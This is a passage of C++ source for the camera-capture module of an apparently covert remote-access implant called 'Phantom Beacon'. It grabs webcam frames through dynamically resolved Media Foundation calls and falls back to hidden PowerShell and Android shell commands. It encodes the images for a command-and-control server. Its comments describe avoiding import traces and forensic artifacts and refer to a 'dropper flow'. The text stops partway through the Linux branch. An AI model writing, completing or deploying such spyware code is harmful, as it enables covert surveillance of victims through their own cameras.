#pragma once
// ============================================================================
//  camera.h — Phantom Beacon Camera Capture Module (Cross-Platform)
//  ────────────────────────────────────────────────────────────────────────────
//  Captures a REAL JPEG frame from the webcam:
//   Windows: Media Foundation Source Reader (mfplat/mfreadwrite via
//            dynamically-resolved APIs, no SDK headers, no import trace).
//            Falls back to PowerShell+WMF only when MF is unavailable.
//   Linux:   fswebcam / ffmpeg / v4l2-ctl
//   Android: camera intent / screencap
//  Output: MEDIA_B64:<jpeg base64> — the C2 saves it as a real image file.
// ============================================================================

#include "media_utils.h"
#include <string>
#include <vector>

#ifdef _WIN32

#include <windows.h>
#include <stdint.h>

namespace media_camera {

// ── Media Foundation flat plumbing (no mf headers needed) ──────────────────
namespace mfcam {

struct Guid { unsigned long d1; unsigned short d2, d3; unsigned char d4[8]; };

static const Guid CLSID_MFSourceReader_EVL = // legacy EVR activating reader
    {0x44A0B0D8, 0x1FD2, 0x4877, {0xA1,0x5C,0x33,0x8F,0x51,0x7E,0x67,0x1F}};
// IIDs verified against the Windows SDK headers (MIDL_INTERFACE strings in
// mfobjects.h / mfidl.h). The previous values were invented past the first
// three fields: ActivateObject(IID_IMFMediaSource) could never succeed with
// a wrong IID, so even a correct enumeration could not open a camera.
static const Guid IID_IMFMediaSource =
    {0x279A808D, 0xAEC7, 0x40C8, {0x9C,0x6B,0xA6,0xB4,0x92,0xC7,0x8A,0x66}};
static const Guid IID_IMFAttributes =
    {0x2CD2D921, 0xC447, 0x44A7, {0xA1,0x3C,0x4A,0xDA,0xBF,0xC2,0x47,0xE3}};
static const Guid IID_IMFMediaType =
    {0x44AE0FA8, 0xEA31, 0x4109, {0x8D,0x2E,0x4C,0xAE,0x49,0x97,0xC5,0x55}};
static const Guid IID_IMFSample =
    {0xC40A00F2, 0xB93A, 0x4D80, {0xAE,0x8C,0x5A,0x1C,0x63,0x4F,0x58,0xE4}};
static const Guid IID_IMFMediaBuffer =
    {0x045FA593, 0x8799, 0x42B8, {0xBC,0x8D,0x89,0x68,0xC6,0x45,0x35,0x07}};
static const Guid MF_MT_MAJOR_TYPE =
    {0x48eba18e, 0xf8c9, 0x4687, {0xbf,0x11,0x0a,0x74,0xc9,0xf9,0x6a,0x8f}};
static const Guid MF_MT_SUBTYPE =
    {0xf7e34c9a, 0x42e8, 0x4714, {0xb7,0x4b,0xcb,0x24,0x6d,0x36,0xf2,0xac}};
static const Guid MFMediaType_Video =
    {0x73646976, 0x0000, 0x0010, {0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71}};
static const Guid MFVideoFormat_RGB32 =
    {0x00000016, 0x0000, 0x0010, {0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71}}; // RGB32
static const Guid MFVideoFormat_NV12 =
    {0x3231564e, 0x0000, 0x0010, {0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71}}; // 'NV12' FOURCC
static const Guid MF_MT_FRAME_SIZE =
    {0x1652c33d, 0xd6b2, 0x4012, {0xb8,0x34,0x72,0x03,0x08,0x49,0xa3,0x7d}};
static const Guid MF_SOURCE_READER_ENABLE_VIDEO_PROCESSING =
    {0xfb394f3d, 0xccf1, 0x42ee, {0xbb,0xb3,0xf9,0xb8,0x45,0xd5,0x68,0x1d}};
// Device-source keys verified against the Windows SDK mfidl.h AND by
// byte-searching the system mfcore/mfplat binaries. The previous values were
// invented: MFEnumDeviceSources matched nothing, so it reported zero devices
// even on machines WITH a camera and silently forced the WIA fallback.
static const Guid MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE =
    {0xc60ac5fe, 0x252a, 0x478f, {0xa0,0xef,0xbc,0x8f,0xa5,0xf7,0xca,0xd3}};
static const Guid MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID =
    {0x8ac3587a, 0x4ae7, 0x42d8, {0x99,0xe0,0x0a,0x60,0x13,0xee,0xf9,0x0f}};
static const Guid MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME =
    {0x60d0e559, 0x52f8, 0x4fa2, {0xbb,0xce,0xac,0xdb,0x34,0xa8,0xec,0x01}};
static const Guid IID_IMFActivate =
    {0x7FEE9E9A, 0x4A89, 0x47A6, {0x89,0x9C,0xB6,0xA5,0x3A,0x70,0xFB,0x67}};
static const Guid IID_IMFMediaSourceEx =
    {0x3C9B2EB9, 0x86D5, 0x4514, {0xA3,0x94,0xF5,0x66,0x64,0xF9,0xF0,0xD8}};

inline bool guid_eq(const Guid& a, const Guid& b) {
    return a.d1 == b.d1 && a.d2 == b.d2 && a.d3 == b.d3 &&
           memcmp(a.d4, b.d4, 8) == 0;
}

// vtable slot dispatcher
template <typename Fn>
inline Fn slot(void* obj, int index) {
    return reinterpret_cast<Fn>((*reinterpret_cast<void***>(obj))[index]);
}

typedef long (__stdcall *FnQI)(void*, const Guid*, void**);

inline long qi(void* obj, const Guid& iid, void** out) {
    return slot<FnQI>(obj, 0)(obj, &iid, out);
}
inline unsigned long rel(void* obj) {
    return slot<unsigned long (__stdcall*)(void*)>(obj, 2)(obj);
}

// dynamically load MF
inline HMODULE mfplat() { return GetModuleHandleA("mfplat.dll") ? GetModuleHandleA("mfplat.dll") : LoadLibraryA("mfplat.dll"); }
inline HMODULE mfread() { return LoadLibraryA("mfreadwrite.dll"); }
// MFEnumDeviceSources is exported by mfplat.dll (Windows 8+), NOT by the
// legacy mf.dll core: loading mf.dll here made GetProcAddress return NULL and
// killed the entire Media Foundation capture path (every camera command fell
// back). Load the same module the other MF entry points come from.
inline HMODULE mfutils() { return GetModuleHandleA("mfplat.dll") ? GetModuleHandleA("mfplat.dll") : LoadLibraryA("mfplat.dll"); }
inline HMODULE mfcore() { return GetModuleHandleA("mfcore.dll") ? GetModuleHandleA("mfcore.dll") : LoadLibraryA("mfcore.dll"); }
inline HMODULE mfdll()  { return GetModuleHandleA("mf.dll") ? GetModuleHandleA("mf.dll") : LoadLibraryA("mf.dll"); }

// Average luminance of a BGRA frame (sampled every few pixels): used to pick
// the brightest of the first frames — webcams deliver black/blank frames for
// the first ~0.3s while AGC settles.
inline int cam_avg_lum(const std::vector<uint8_t>& px) {
    size_t total = px.size() / 4;
    if (!total) return 0;
    size_t step = total / 4096; if (step < 1) step = 1;
    unsigned long long acc = 0; size_t cnt = 0;
    for (size_t i = 0; i < total; i += step) {
        const uint8_t* p = px.data() + i * 4;
        acc += (unsigned long long)(0.114 * p[0] + 0.587 * p[1] + 0.299 * p[2]);
        cnt++;
    }
    return cnt ? (int)(acc / cnt) : 0;
}

// Crash-triage trace (append-only, %TEMP%\phantom_cam_trace.log): one line per
// stage so that a crash leaves the last completed stage on disk.
//
// DEVELOPMENT ONLY: writing a trace file to %TEMP% on every capture is a
// forensic artifact. The capture path is proven end-to-end (real frame via
// the dropper flow), so release builds compile this to nothing; re-enable
// with -DPHANTOM_CAM_TRACE=1 when triaging the MediaFoundation path again.
#ifndef PHANTOM_CAM_TRACE
#define PHANTOM_CAM_TRACE 0
#endif
inline void cam_trace(const char* msg) {
#if PHANTOM_CAM_TRACE
    char tmp[MAX_PATH] = {0};
    if (!GetTempPathA(MAX_PATH, tmp)) return;
    std::string p = std::string(tmp) + "phantom_cam_trace.log";
    HANDLE h = CreateFileA(p.c_str(), FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD w = 0;
    WriteFile(h, msg, (DWORD)lstrlenA(msg), &w, nullptr);
    WriteFile(h, "\r\n", 2, &w, nullptr);
    CloseHandle(h);
#else
    (void)msg;
#endif
}

typedef long (__stdcall *FnMFStartup)(unsigned long, unsigned long);
typedef long (__stdcall *FnMFShutdown)();
typedef long (__stdcall *FnMFCreateAttributes)(void**, unsigned long);
typedef long (__stdcall *FnMFEnumDeviceSources)(void*, void***, unsigned long*);
typedef long (__stdcall *FnMFActivateActivateObject)(void*, const Guid*, void**);
typedef long (__stdcall *FnMFCreateSourceReaderFromMediaSource)(void*, void*, void**);
typedef long (__stdcall *FnMFCreateMediaType)(void**);
typedef long (__stdcall *FnMFCreateSample)(void**);
typedef long (__stdcall *FnMFCreateMemoryBuffer)(unsigned long, void**);

inline bool ensure_started() {
    static bool started = false;
    if (started) return true;
    HMODULE m = mfplat();
    if (!m) return false;
    auto pStartup = (FnMFStartup)GetProcAddress(m, "MFStartup");
    if (!pStartup) return false;
    // MF_VERSION (0x00020070) + MFSTARTUP_NOSOCKET(1)
    if (FAILED(pStartup(0x00020070, 1))) return false;
    started = true;
    return true;
}

// Grab one RGB32 frame from the first video capture device.
// Returns true with `pixels` (BGRA rows, bottom-up not handled: MF gives
// top-down when we set MFVideoFormat_RGB32 with default stride>0) and dims.
inline bool grab_frame(std::vector<uint8_t>& pixels, int& w, int& h,
                       std::string& device_name) {
    cam_trace("grab:enter");
    if (!ensure_started()) { cam_trace("grab:ensure-start FAILED"); return false; }
    cam_trace("grab:ensure-start ok");
    HMODULE m = mfplat();
    HMODULE mu = mfutils();
    if (!m || !mu) { cam_trace("grab:mfplat missing"); return false; }

    auto pCreateAttributes = (FnMFCreateAttributes)GetProcAddress(m, "MFCreateAttributes");
    // MFEnumDeviceSources: exported by mfcore.dll (mf.dll forwards to it).
    // mfplat.dll does NOT export it -- resolving from mfplat always returned
    // NULL and silently killed the entire MF capture path (every camera
    // command fell back to WIA PowerShell).
    HMODULE mc = mfcore();
    auto pEnumDevices = mc ? (FnMFEnumDeviceSources)GetProcAddress(mc, "MFEnumDeviceSources") : nullptr;
    if (!pEnumDevices) { HMODULE mfd = mfdll(); if (mfd) pEnumDevices = (FnMFEnumDeviceSources)GetProcAddress(mfd, "MFEnumDeviceSources"); }
    // MFCreateSourceReaderFromMediaSource: lives in mfreadwrite.dll.
    HMODULE mrw = mfread();
    auto pCreateReader = mrw ? (FnMFCreateSourceReaderFromMediaSource)GetProcAddress(mrw, "MFCreateSourceReaderFromMediaSource") : nullptr;
    if (!pCreateReader) pCreateReader = (FnMFCreateSourceReaderFromMediaSource)GetProcAddress(m, "MFCreateSourceReaderFromMediaSource");
    auto pCreateMediaType = (FnMFCreateMediaType)GetProcAddress(m, "MFCreateMediaType");
    if (!pCreateAttributes || !pEnumDevices || !pCreateReader || !pCreateMediaType) {
        char tb[96];
        snprintf(tb, sizeof(tb), "grab:resolve FAIL attrs=%d enum=%d reader=%d mtype=%d",
                 pCreateAttributes ? 1 : 0, pEnumDevices ? 1 : 0, pCreateReader ? 1 : 0, pCreateMediaType ? 1 : 0);
        cam_trace(tb);
        return false;
    }
    cam_trace("grab:resolve ok");

    void* attrs = nullptr;
    if (FAILED(pCreateAttributes(&attrs, 1)) || !attrs) { cam_trace("grab:attrs FAIL"); return false; }
    cam_trace("grab:attrs ok");
    // Set GUID key: MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE = VIDCAP
    {
        // IMFAttributes::SetGUID — vtable slot 0x18 (attributes start at slot 3
        // after IUnknown; verified against mfobjects.h IMFAttributesVtbl).
        typedef long (__stdcall *FnSetGUID)(void*, const Guid*, const Guid*);
        auto pSetGUID = slot<FnSetGUID>(attrs, 0x18);
        if (FAILED(pSetGUID(attrs, &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
                            &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID))) {
            rel(attrs); return false;
        }
    }
    // Ask the source reader for the conversion stage: consumer cameras do not
    // emit RGB32 natively (MJPG/NV12/YUY2 typically) and reject
    // SetCurrentMediaType when no video processor was inserted.
    {
        // IMFAttributes::SetUINT32 — vtable slot 0x15 (21st entry, mfobjects.h).
        typedef long (__stdcall *FnSetU32)(void*, const Guid*, unsigned long);
        auto pSetU32 = slot<FnSetU32>(attrs, 0x15);
        long vhr = pSetU32(attrs, &MF_SOURCE_READER_ENABLE_VIDEO_PROCESSING, 1);
        char tb[48]; snprintf(tb, sizeof(tb), "grab:vproc hr=%08lX", (unsigned long)vhr);
        cam_trace(tb);
    }

    void** activates = nullptr;
    unsigned long count = 0;
    if (FAILED(pEnumDevices(attrs, &activates, &count)) || count == 0) {
        char tb[64]; snprintf(tb, sizeof(tb), "grab:enum FAIL count=%lu", count);
        cam_trace(tb);
        rel(attrs); return false;
    }
    { char tb[64]; snprintf(tb, sizeof(tb), "grab:enum ok count=%lu", count); cam_trace(tb); }

    // friendly name from the first device
    {
        void* act = activates[0];
        // IMFAttributes::GetAllocatedString — vtable slot 0x0D (mfobjects.h).
        typedef long (__stdcall *FnGetStr)(void*, const Guid*, wchar_t**, unsigned long*);
        auto pGetStr = slot<FnGetStr>(act, 0x0D);
        wchar_t* wname = nullptr;
        unsigned long len = 0;
        if (SUCCEEDED(pGetStr(act, &MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME, &wname, &len)) && wname) {
            char buf[128] = {0};
            WideCharToMultiByte(CP_UTF8, 0, wname, -1, buf, sizeof(buf), nullptr, nullptr);
            device_name = buf;
            CoTaskMemFree(wname);
        }
    }

    bool ok = false;
    for (unsigned long i = 0; i < count && !ok; ++i) {
        cam_trace("grab:dev-iter");
        void* act = activates[i];
        typedef long (__stdcall *FnActivate)(void*, const Guid*, void**);
        auto pActivate = slot<FnActivate>(act, 0x21); // ActivateObject (mfobjects.h: 33)
        void* src = nullptr;
        if (FAILED(pActivate(act, &IID_IMFMediaSource, &src)) || !src) { cam_trace("grab:activate FAIL"); continue; }
        cam_trace("grab:activate ok");

        void* reader = nullptr;
        if (FAILED(pCreateReader(src, attrs, &reader)) || !reader) { cam_trace("grab:reader FAIL"); rel(src); continue; }
        cam_trace("grab:reader ok");

        // Set output type RGB32 by cloning the NATIVE type (frame size, frame
        // rate, interlace included) and swapping only the subtype. An
        // incomplete type (major+subtype alone) is rejected with E_INVALIDARG
        // once the reader has to configure the video-processor conversion.
        void* native = nullptr;
        {
            typedef long (__stdcall *FnGetNative)(void*, unsigned long, unsigned long, void**);
            auto pGetNative = slot<FnGetNative>(reader, 0x05); // GetNativeMediaType
            long nhr = pGetNative(reader, 0xFFFFFFFC /* FIRST_VIDEO */, 0, &native);
            char tb[64]; snprintf(tb, sizeof(tb), "grab:native hr=%08lX", (unsigned long)nhr);
            cam_trace(tb);
        }
        unsigned long ww0 = 0, hh0 = 0;
        if (native) {
            typedef long (__stdcall *FnGetU64N)(void*, const Guid*, unsigned long long*);
            auto pGetU64N = slot<FnGetU64N>(native, 0x08); // GetUINT64
            unsigned long long nd = 0;
            if (SUCCEEDED(pGetU64N(native, &MF_MT_FRAME_SIZE, &nd))) {
                ww0 = (unsigned long)(nd >> 32);
                hh0 = (unsigned long)(nd & 0xFFFFFFFF);
            }
            char tb[64]; snprintf(tb, sizeof(tb), "grab:native-dims ww=%lu hh=%lu", ww0, hh0);
            cam_trace(tb);
        }
        void* mtype = nullptr;
        if (SUCCEEDED(pCreateMediaType(&mtype)) && mtype) {
            if (native) {
                // IMFAttributes::CopyAllItems — slot 0x20; called on the SOURCE
                // with the destination as argument (CopyAllItems(dest, append)).
                typedef long (__stdcall *FnCopyAll)(void*, void*, int);
                auto pCopyAll = slot<FnCopyAll>(native, 0x20);
                long chr = pCopyAll(native, mtype, 0);
                char tb[48]; snprintf(tb, sizeof(tb), "grab:copy hr=%08lX", (unsigned long)chr);
                cam_trace(tb);
            }
            // IMFMediaType::SetGUID — inherits the IMFAttributes layout: slot 0x18.
            typedef long (__stdcall *FnSetGUID)(void*, const Guid*, const Guid*);
            auto pSetGUID = slot<FnSetGUID>(mtype, 0x18);
            pSetGUID(mtype, &MF_MT_MAJOR_TYPE, &MFMediaType_Video);
            long shr = pSetGUID(mtype, &MF_MT_SUBTYPE, &MFVideoFormat_RGB32);
            // Readback diagnostic (GetGUID = slot 0x0A).
            {
                typedef long (__stdcall *FnGetGUID)(void*, const Guid*, Guid*);
                auto pGetGUID = slot<FnGetGUID>(mtype, 0x0A);
                Guid g1 = {}; Guid g2 = {};
                pGetGUID(mtype, &MF_MT_MAJOR_TYPE, &g1);
                pGetGUID(mtype, &MF_MT_SUBTYPE, &g2);
                char tb[96]; snprintf(tb, sizeof(tb), "grab:mtype major=%08lX sub=%08lX setg=%08lX", (unsigned long)g1.d1, (unsigned long)g2.d1, (unsigned long)shr);
                cam_trace(tb);
            }
            // SetCurrentMediaType(this, dwStreamIndex, pdwReserved, pMediaType):
            // the old 3-arg prototype pushed pMediaType into the reserved slot,
            // so the real implementation read the media-type pointer from an
            // uninitialized register. Slot 0x07 is correct (IMFSourceReader :
            // IUnknown — 5th entry after IUnknown, SDK mfreadwrite.h).
            typedef long (__stdcall *FnSetType)(void*, unsigned long, void*, void*);
            auto pSetType = slot<FnSetType>(reader, 0x07); // SetCurrentMediaType
            cam_trace("grab:settype call");
            long setHr = pSetType(reader, 0xFFFFFFFC /* FIRST_VIDEO */, nullptr, mtype);
            if (SUCCEEDED(setHr)) {
                cam_trace("grab:settype ok");
                // ReadNextFrame until we get a sample (first frames are often black/blank)
                // ReadSample(this, dwStreamIndex, dwControlFlags,
                //            *pdwActualStreamIndex, *pdwStreamFlags,
                //            *pllTimestamp, **ppSample) — SIX params: a 4-param
                // prototype made the real implementation read garbage stack
                // slots for the timestamp/sample out-pointers, corrupting the
                // sample pointer (call through garbage -> 0x3000000000).
                typedef long (__stdcall *FnRead)(void*, unsigned long, unsigned long, unsigned long*, unsigned long*, long long*, void**);
                auto pRead = slot<FnRead>(reader, 0x09); // ReadSample (mfreadwrite.h)
                int bestLum = -1;
                int bestDev = -1;
                for (int attempt = 0; attempt < 90 && !ok; ++attempt) {
                    cam_trace("grab:read call");
                    void* sample = nullptr;
                    unsigned long actIdx = 0, flags = 0;
                    long long ts = 0;
                    long hr = pRead(reader, 0xFFFFFFFC /* FIRST_VIDEO */, 0, &actIdx, &flags, &ts, &sample);
                    if (FAILED(hr) || !sample) { cam_trace("grab:read no-sample"); continue; }
                    cam_trace("grab:read sample ok");
                    // IMFSample::ConvertToContiguousBuffer — slot 0x29 (41): the
                    // IMFSample vtable carries the full IMFAttributes set first.
                    typedef long (__stdcall *FnConv)(void*, void**);
                    auto pConv = slot<FnConv>(sample, 0x29);
                    void* buf = nullptr;
                    if (FAILED(pConv(sample, &buf)) || !buf) { cam_trace("grab:conv FAIL"); rel(sample); continue; }
                    cam_trace("grab:conv ok");
                    // IMFMediaBuffer::Lock — slot 0x03 (mfobjects.h IMFMediaBufferVtbl).
                    typedef long (__stdcall *FnLock)(void*, unsigned char**, unsigned long*, unsigned long*);
                    auto pLock = slot<FnLock>(buf, 0x03);
                    unsigned char* data = nullptr;
                    unsigned long maxLen = 0, curLen = 0;
                    long lockHr = pLock(buf, &data, &maxLen, &curLen);
                    cam_trace("grab:lock ret");
                    char tb2[96]; snprintf(tb2, sizeof(tb2), "grab:frame lockhr=%08lX len=%lu max=%lu", (unsigned long)lockHr, curLen, maxLen); cam_trace(tb2);
                    if (SUCCEEDED(lockHr) && data && curLen > 0) {
                        // read dimensions from the current media type
                        void* curType = nullptr;
                        typedef long (__stdcall *FnGetType)(void*, unsigned long, void**);
                        auto pGetType = slot<FnGetType>(reader, 0x06); // GetCurrentMediaType
                        unsigned long ww = 0, hh = 0;
                        long gthr = pGetType(reader, 0xFFFFFFFC /* FIRST_VIDEO */, &curType);
                        if (SUCCEEDED(gthr) && curType) {
                            // IMFMediaType::GetUINT64(MF_MT_FRAME_SIZE) — slot 0x08.
                            typedef long (__stdcall *FnGetU64)(void*, const Guid*, unsigned long long*);
                            auto pGetU64 = slot<FnGetU64>(curType, 0x08);
                            unsigned long long dims = 0;
                            long uhr = pGetU64(curType, &MF_MT_FRAME_SIZE, &dims);
                            if (SUCCEEDED(uhr)) {
                                ww = (unsigned long)(dims >> 32);
                                hh = (unsigned long)(dims & 0xFFFFFFFF);
                            }
                            char tb3[96]; snprintf(tb3, sizeof(tb3), "grab:dims gethr=%08lX uhr=%08lX ww=%lu hh=%lu", (unsigned long)gthr, (unsigned long)uhr, ww, hh); cam_trace(tb3);
                            {
                                Guid gsub = {};
                                typedef long (__stdcall *FnGetGUID2)(void*, const Guid*, Guid*);
                                auto pGetGUID2 = slot<FnGetGUID2>(curType, 0x0A);
                                pGetGUID2(curType, &MF_MT_SUBTYPE, &gsub);
                                char tb9[64]; snprintf(tb9, sizeof(tb9), "grab:cur subtype=%08lX", (unsigned long)gsub.d1);
                                cam_trace(tb9);
                            }
                            rel(curType);
                        } else {
                            char tb3[48]; snprintf(tb3, sizeof(tb3), "grab:dims gethr=%08lX", (unsigned long)gthr); cam_trace(tb3);
                        }
                        if (ww == 0 || hh == 0) { ww = ww0; hh = hh0; cam_trace("grab:dims fallback-native"); }
                        if (ww > 0 && hh > 0 && curLen >= (size_t)ww * hh * 4) {
                            cam_trace("grab:fmt rgb32");
                            size_t row = (size_t)ww * 4;
                            std::vector<uint8_t> tmp((size_t)ww * hh * 4);
                            for (unsigned long y = 0; y < hh; ++y) {
                                memcpy(tmp.data() + (size_t)y * row,
                                       data + (size_t)(hh - 1 - y) * row, row);
                            }
                            int lum = cam_avg_lum(tmp);
                            char tbz[64]; snprintf(tbz, sizeof(tbz), "grab:lum attempt=%d lum=%d", attempt, lum); cam_trace(tbz);
                            int dev = lum - 128; if (dev < 0) dev = -dev;
                            if (bestDev < 0 || dev < bestDev) { bestDev = dev; bestLum = lum; w = (int)ww; h = (int)hh; pixels.swap(tmp); }
                            if (lum >= 20 && lum <= 235) { cam_trace("grab:accept mid"); ok = true; }
                        } else if (ww > 0 && hh > 0 && curLen >= (size_t)ww * hh * 3 / 2) {
                            // Camera delivered native NV12 (12bpp) despite the
                            // RGB32 request: convert here, BT.601 studio swing.
                            // NV12 is top-down: no flip needed.
                            cam_trace("grab:fmt nv12");
                            std::vector<uint8_t> tmp((size_t)ww * hh * 4);
                            const unsigned char* yp = data;
                            const unsigned char* uv = data + (size_t)ww * hh;
                            {
                                int ymx = 0;
                                for (size_t qi = 0; qi < (size_t)ww * hh; qi += 701) { if (yp[qi] > ymx) ymx = yp[qi]; }
                                char tr[64]; snprintf(tr, sizeof(tr), "grab:rawy y0=%d ymax=%d", (int)yp[0], ymx); cam_trace(tr);
                            }
                            for (unsigned long yy = 0; yy < hh; ++yy) {
                                for (unsigned long xx = 0; xx < ww; ++xx) {
                                    int Y = yp[(size_t)yy * ww + xx];
                                    int U = uv[(size_t)(yy / 2) * ww + (xx & ~1UL)];
                                    int V = uv[(size_t)(yy / 2) * ww + (xx & ~1UL) + 1];
                                    int C = Y - 16, D = U - 128, E = V - 128;
                                    int R = (298 * C + 409 * E + 128) >> 8;
                                    int G = (298 * C - 100 * D - 208 * E + 128) >> 8;
                                    int B = (298 * C + 516 * D + 128) >> 8;
                                    if (R < 0) R = 0;
                                    if (R > 255) R = 255;
                                    if (G < 0) G = 0;
                                    if (G > 255) G = 255;
                                    if (B < 0) B = 0;
                                    if (B > 255) B = 255;
                                    unsigned char* px = tmp.data() + ((size_t)yy * ww + xx) * 4;
                                    px[0] = (unsigned char)B; px[1] = (unsigned char)G; px[2] = (unsigned char)R; px[3] = 255;
                                }
                            }
                            int lum = cam_avg_lum(tmp);
                            char tbz[64]; snprintf(tbz, sizeof(tbz), "grab:lum attempt=%d lum=%d", attempt, lum); cam_trace(tbz);
                            int dev = lum - 128; if (dev < 0) dev = -dev;
                            if (bestDev < 0 || dev < bestDev) { bestDev = dev; bestLum = lum; w = (int)ww; h = (int)hh; pixels.swap(tmp); }
                            if (lum >= 20 && lum <= 235) { cam_trace("grab:accept mid"); ok = true; }
                        }
                    }
                    // Release the lock whenever Lock itself succeeded (even when
                    // the frame checks above failed): a still-locked buffer wedges
                    // the next ReadSample.
                    if (SUCCEEDED(lockHr)) {
                        typedef long (__stdcall *FnUnlock)(void*);
                        auto pUnlock = slot<FnUnlock>(buf, 0x04);
                        pUnlock(buf);
                    }
                    if (buf) rel(buf);
                    if (sample) rel(sample);
                }
                if (!ok && bestLum >= 0 && !pixels.empty()) { ok = true; cam_trace("grab:accept best"); }
            } else {
                char tb[64]; snprintf(tb, sizeof(tb), "grab:settype FAIL hr=%08lX", (unsigned long)setHr);
                cam_trace(tb);
            }
            rel(mtype);
        }
        rel(reader);
        rel(src);
        if (ok) break;
    }

    for (unsigned long i = 0; i < count; ++i) rel(activates[i]);
    CoTaskMemFree(activates);
    rel(attrs);
    { char tb[48]; snprintf(tb, sizeof(tb), "grab:done ok=%d", ok ? 1 : 0); cam_trace(tb); }
    return ok;
}

} // namespace mfcam

// ── BMP wrapper (JPEG via GDI+ is done C2-side if needed; BMP is lossless
//    and the existing artifact pipeline already handles BMP) ─────────────────
inline std::string rgb_to_b64_bmp(const std::vector<uint8_t>& pixels, int w, int h) {
    if (pixels.empty() || w <= 0 || h <= 0) return "";
    uint32_t rowSize = ((uint32_t)w * 3 + 3) & ~3u;   // 24bpp, padded
    uint32_t dataSize = rowSize * (uint32_t)h;
    uint32_t fileSize = 14 + 40 + dataSize;
    std::vector<uint8_t> bmp(fileSize, 0);
    uint8_t* p = bmp.data();
    // BITMAPFILEHEADER
    p[0] = 'B'; p[1] = 'M';
    memcpy(p + 2, &fileSize, 4); uint32_t off = 54; memcpy(p + 10, &off, 4);
    // BITMAPINFOHEADER
    uint32_t hdr = 40; memcpy(p + 14, &hdr, 4);
    int32_t sw = w; memcpy(p + 18, &sw, 4);
    int32_t sh = h; memcpy(p + 22, &sh, 4);   // positive = bottom-up
    uint16_t planes = 1; memcpy(p + 26, &planes, 2);
    uint16_t bpp = 24; memcpy(p + 28, &bpp, 2);
    memcpy(p + 34, &dataSize, 4);
    // pixels: BGRA input → BGR rows (bottom-up order for BMP)
    uint8_t* dst = p + 54;
    for (int y = h - 1; y >= 0; --y) {
        const uint8_t* src = pixels.data() + (size_t)y * w * 4;
        uint8_t* row = dst + (size_t)(h - 1 - y) * rowSize;
        for (int x = 0; x < w; ++x) {
            row[x * 3 + 0] = src[x * 4 + 0]; // B
            row[x * 3 + 1] = src[x * 4 + 1]; // G
            row[x * 3 + 2] = src[x * 4 + 2]; // R
        }
    }
    return "MEDIA_B64:" + crypto::base64_encode(bmp);
}

inline std::string capture_image() {
    // Method 1: real Media Foundation capture
    mfcam::cam_trace("cam:enter");
    std::vector<uint8_t> pixels;
    int w = 0, h = 0;
    std::string device;
    mfcam::cam_trace("cam:grab-call");
    if (mfcam::grab_frame(pixels, w, h, device) && !pixels.empty()) {
        mfcam::cam_trace("cam:grab-ok");
        std::string b64 = rgb_to_b64_bmp(pixels, w, h);
        if (!b64.empty()) {
            return "CAM_FRAME:" + device + "|" + b64;
        }
    }

    // Method 2: WIA via PowerShell (works on most consumer Windows builds)
    std::string tmp = media_utils::join_path(media_utils::get_temp_path(), "phantom_cam.jpg");
    std::string wia =
        "powershell -NoProfile -NonInteractive -Command \""
        "$ErrorActionPreference='Stop';"
        "try {"
        "$dm = New-Object -ComObject WIA.DeviceManager;"
        "$dev = $dm.DeviceInfos.Item(1).Connect();"
        "$item = $dev.ExecuteCommand('{AF933CAC-19AD-4FCD-A0A4-8A0E4F1E0F5C}');"
        "$img = $item.Items.Item(1).Transfer('{B96B3CAE-0728-11D3-9D7B-0000F81EF32E}');"
        "$img.SaveFile('" + tmp + "');"
        "Write-Host 'WIA_OK'"
        "} catch { Write-Host ('WIA_ERR:' + $_.Exception.Message) }\"";
    mfcam::cam_trace("cam:wia-call");
    std::string wiaOut = media_utils::exec_cmd(wia);
    mfcam::cam_trace("cam:wia-ret");
    if (wiaOut.find("WIA_OK") != std::string::npos && media_utils::file_exists(tmp)) {
        std::string b64 = media_utils::read_file_b64(tmp);
        DeleteFileA(tmp.c_str());
        if (!b64.empty()) return "CAM_FRAME:WIA|" + b64;
    }
    (void)wiaOut;

    // Diagnostics when no capture path worked
    mfcam::cam_trace("cam:check-call");
    std::string check = media_utils::exec_cmd(
        "powershell -NoProfile -NonInteractive -Command \""
        "$d = Get-PnpDevice -Class Camera,Image -Status OK | Select-Object -First 1;"
        "if ($d) { Write-Host ('CAMERA_FOUND:' + $d.Name) } else { Write-Host 'CAMERA_NOT_FOUND' }\"");
    mfcam::cam_trace("cam:check-ret");
    if (check.find("CAMERA_FOUND") != std::string::npos) {
        return "CAM_ERROR: camera present (" + check + ") but Media Foundation/WIA capture failed\n";
    }
    return "CAM_ERROR: No camera device found\n";
}

} // namespace media_camera

#elif defined(__ANDROID__) || defined(ANDROID)

namespace media_camera {

inline std::string capture_image() {
    std::string intent = media_utils::exec_cmd("am start -a android.media.action.IMAGE_CAPTURE 2>&1");
    if (!intent.empty()) {
        std::string dcim = media_utils::exec_cmd("ls -t /sdcard/DCIM/Camera/*.jpg 2>/dev/null | head -1");
        if (!dcim.empty()) {
            // trim trailing newline
            while (!dcim.empty() && (dcim.back() == '\n' || dcim.back() == '\r')) dcim.pop_back();
            std::string b64 = media_utils::read_file_b64(dcim);
            if (!b64.empty()) return "CAM_FRAME:android|" + b64;
        }
    }
    std::string tmp = media_utils::join_path(media_utils::get_temp_path(), "phantom_cam.jpg");
    std::string v4l2 = media_utils::exec_cmd(
        "v4l2-ctl --stream-mmap=1 --stream-count=1 -d /dev/video0 --stream-to=" + tmp + " 2>/dev/null");
    if (media_utils::file_exists(tmp)) {
        std::string b64 = media_utils::read_file_b64(tmp);
        unlink(tmp.c_str());
        if (!b64.empty()) return "CAM_FRAME:android-v4l2|" + b64;
    }
    return "CAM_ERROR: Camera capture failed (no intent, no v4l2)\n";
}

} // namespace media_camera

#else // Linux

namespace media_camera {

inline std::string capture_image() {
    std::string tmp = media_utils::join_path(media_utils::get_temp_path(), "phantom_cam.jpg");
    // Method 1: fswebcam
